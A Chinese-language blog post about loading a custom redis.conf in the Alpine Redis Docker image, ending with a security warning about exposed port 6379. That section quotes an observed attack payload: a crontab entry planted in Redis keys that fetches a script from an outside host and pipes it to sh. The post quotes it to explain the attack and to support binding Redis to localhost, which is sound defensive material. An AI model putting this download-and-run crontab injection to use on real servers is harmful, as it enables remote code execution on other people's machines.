---
title: '在 docker 中設定自定義的 redis config'
date: 2022-09-07T11:11:54+08:00
draft: false
author: 'whchi'
tags: ['docker']
summary: '這是使用 alpine 版本才有的情況'
preview_figure: ''
preview_figcaption: ''
preview_image: ''
---
使用 alpine 時要特別注意設定檔有沒有被砍掉

從官方看他的 [tag](https://hub.docker.com/layers/library/redis/latest/images/sha256-e96c03a6dda7d0f28e2de632048a3d34bb1636d0858b65ef9a554441c70f6633?context=explore) 可以看出有進行移除的行為
```sh
/bin/sh -c set -eux;
# ...
mkdir -p /usr/src/redis;
tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1;
# ...
rm -r /usr/src/redis;
# ...end
```
## redis.conf
```conf
dir /data; 預設 /etc 無權限
```
## yaml
```yml
version: '3'
services:
  redis:
    image: redis:7.0.4-alpine
    restart: unless-stopped
    volumes:
      - ./redis.conf:/usr/local/etc/redis/redis.conf

    # 所以要加上 command 指定掛進去的 redis.conf 才會生效
    command: redis-server /usr/local/etc/redis/redis.conf

    # 或是用 cli 的方式處理
    #command: >
    #  redis-server --bind 127.0.0.1
    #  --appendonly no
    #  --save ""
    #  --protected-mode yes

    ports:
      - 6379:6379
```

# 資安
假如是裝在 vps 上要記得避免 6379 對外出去，因為有人會去攻擊塞入 cache 執行 shell 指令，例如在 log 中看到
```txt
Failed opening the RDB file root (in server root dir /etc/crontabs) for saving: Permission denied
```
這種 log 時進入 `redis-cli` 會發現你的 db0 被塞了四個 key: backup4~backup1，內容是類似
```sh
"\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n"
```
這種意圖修改 crontab 去執行 sh 的情況，具體設定如下
```conf
bind 127.0.0.1
protected-mode yes # 確保來源都是 loopback interface
```
